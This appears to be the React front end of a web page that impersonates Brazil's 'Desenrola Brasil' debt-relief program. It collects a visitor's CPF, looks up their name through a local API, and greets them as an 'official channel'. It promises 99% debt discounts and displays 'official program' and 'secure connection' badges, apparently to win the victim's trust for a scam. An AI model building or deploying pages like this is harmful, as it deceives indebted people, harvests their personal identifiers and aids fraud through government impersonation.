'use client'

import { useState } from 'react'
import { Info, Lock, ShieldCheck } from 'lucide-react'

function formatarCpf(valor: string) {
  const digitos = valor.replace(/\D/g, '').slice(0, 11)
  return digitos
    .replace(/(\d{3})(\d)/, '$1.$2')
    .replace(/(\d{3})(\d)/, '$1.$2')
    .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
}

type Resultado = {
  nome: string | null
}

export default function RenegociarClient() {
  const [cpf, setCpf] = useState('')
  const [consultando, setConsultando] = useState(false)
  const [erro, setErro] = useState<string | null>(null)
  const [resultado, setResultado] = useState<Resultado | null>(null)

  const valido = cpf.replace(/\D/g, '').length === 11

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault()
    if (!valido || consultando) return

    setConsultando(true)
    setErro(null)

    try {
      const digitos = cpf.replace(/\D/g, '')
      const resposta = await fetch(`/api/consulta-cpf?cpf=${digitos}`, { cache: 'no-store' })
      const dados = await resposta.json()

      console.log('[v0] resposta consulta-cpf:', dados)

      if (!resposta.ok || !dados.ok) {
        const detalhe = dados?.debug ? ` (${JSON.stringify(dados.debug)})` : ''
        throw new Error((dados?.erro || 'Não foi possível consultar o CPF.') + detalhe)
      }

      setResultado({ nome: dados.nome })
    } catch (e) {
      setErro(e instanceof Error ? e.message : 'Não foi possível consultar o CPF. Tente novamente.')
    } finally {
      setConsultando(false)
    }
  }

  if (resultado) {
    const nome = resultado.nome?.toUpperCase() || 'CLIENTE'
    return (
      <article className="w-full max-w-[640px] space-y-6 rounded-lg bg-white px-4 py-6 shadow-sm sm:px-6 sm:py-8 md:px-10 md:py-10">
        <img
          alt="Uma nova chance para perdoar suas dívidas — Programa Desenrola Brasil"
          className="block h-auto w-full rounded-lg"
          src="/assets/nova-chance-hero.png"
        />

        <section
          aria-label="Mensagem de boas-vindas"
          className="w-full rounded-xl bg-[#1e40af] px-4 py-5 text-sm leading-relaxed text-white shadow-sm sm:px-6 sm:py-6 sm:text-base"
        >
          <p>
            Olá <span className="font-bold">{nome}</span>, esse é um canal oficial de atendimento do Desenrola Brasil e
            os seus dados estão seguros conosco. 🔒
          </p>
        </section>

        <section
          aria-label="Vídeo institucional"
          className="mx-auto w-full max-w-4xl overflow-hidden rounded-lg border border-gray-300 bg-black shadow-sm"
        >
          <video
            src="/assets/desenrola-brasil-atendimento.mp4"
            autoPlay
            playsInline
            preload="auto"
            className="pointer-events-none h-auto w-full object-contain"
            aria-label="Vídeo institucional do Desenrola Brasil"
            onError={(e) => {
              ;(e.currentTarget.parentElement as HTMLElement).style.display = 'none'
            }}
          >
            Seu navegador não suporta a reprodução de vídeo.
          </video>
        </section>
      </article>
    )
  }

  return (
    <article className="w-full max-w-[640px] rounded-lg bg-white px-4 py-6 shadow-sm sm:px-6 sm:py-8 md:px-10 md:py-10">
      <img
        src="/assets/limpe-nome-logo.png"
        alt="Limpe seu Nome e Desenrola, Brasil!"
        className="mx-auto h-auto w-44 object-contain sm:w-56 md:w-72"
      />

      <p className="mt-4 text-center text-sm leading-snug text-gray-800 sm:mt-6 sm:text-base md:text-lg">
        <span className="mr-1 inline-block align-middle text-[#22c55e]">✅</span>
        <strong>ATUALIZADO</strong> - Informe seu CPF e clique em &quot;Continuar&quot; para
        <br className="hidden sm:block" /> renegociar suas dívidas com descontos de 99%
      </p>

      <form className="mt-6 sm:mt-8" onSubmit={handleSubmit}>
        <label htmlFor="cpf" className="mb-2 block text-sm font-bold text-gray-900 sm:text-base">
          CPF
        </label>
        <input
          id="cpf"
          name="cpf"
          type="tel"
          inputMode="numeric"
          autoComplete="off"
          placeholder="000.000.000-00"
          value={cpf}
          onChange={(e) => {
            setCpf(formatarCpf(e.target.value))
            setErro(null)
          }}
          className="w-full rounded-lg border border-gray-300 px-3 py-3.5 text-base text-gray-700 placeholder:text-gray-400 focus:border-transparent focus:ring-2 focus:ring-[#1e40af] focus:outline-none sm:px-4 sm:py-4 sm:text-lg"
          required
        />
        <button
          type="submit"
          disabled={!valido || consultando}
          className="mt-4 flex w-full items-center justify-center gap-2 rounded-full bg-[#1e40af] py-3.5 text-base font-semibold text-white transition-colors hover:bg-[#1a3696] disabled:cursor-not-allowed disabled:opacity-70 sm:mt-5 sm:py-4 sm:text-lg"
        >
          {consultando ? 'Consultando...' : 'Continuar'}
        </button>
      </form>

      {erro && (
        <p role="alert" className="mt-3 text-center text-sm text-red-600">
          {erro}
        </p>
      )}

      <div className="mt-6 flex items-start gap-3 rounded-lg bg-[#eef2ff] px-4 py-4 text-sm text-[#1e40af] sm:text-base">
        <Info className="mt-0.5 size-5 shrink-0" aria-hidden="true" />
        <p className="leading-snug">
          O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
        </p>
      </div>

      <div className="mt-6 flex flex-wrap items-center justify-center gap-x-8 gap-y-2 text-sm text-gray-600">
        <span className="flex items-center gap-1.5">
          <Lock className="size-4" aria-hidden="true" /> Conexão segura
        </span>
        <span className="flex items-center gap-1.5">
          <ShieldCheck className="size-4" aria-hidden="true" /> Programa oficial
        </span>
      </div>
      <p className="mt-3 text-center text-xs text-gray-400">
        Sistema de Renegociação — Todos os direitos reservados
      </p>
    </article>
  )
}
